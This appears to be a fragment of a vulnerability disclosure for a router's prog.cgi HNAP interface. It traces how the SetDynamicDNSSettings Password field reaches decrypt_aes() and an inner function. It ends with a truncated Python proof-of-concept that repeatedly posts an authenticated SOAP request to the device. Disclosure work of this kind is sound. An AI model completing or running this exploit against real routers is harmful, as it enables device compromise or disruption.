...
In prog.cgi, we can find the code details in sub_44B424,the program passes the contents obtained by the /SetDynamicDNSSettings/Password parameter to V3, then passed to V9.

![](pic/code1.png "")

The V9 parameter is called by the function decrypt_aes (). In the decrypt_aes () function, it is passed to the sub_427184 ().
...
for i in range(REPEAT_TIMES):
	...
	<soap:Body>
		<SetDynamicDNSSettings xmlns="http://purenetworks.com/HNAP1/"> 
    ...
    headers['SOAPAction'] = '"http://purenetworks.com/HNAP1/SetDynamicDNSSettings"'
    headers['HNAP_AUTH'] = hnap_auth("SetDynamicDNSSettings", private_key)
    r = requests.post(f'http://{IP}/HNAP1/', data=payload, headers=headers)
    print(r.text)
```
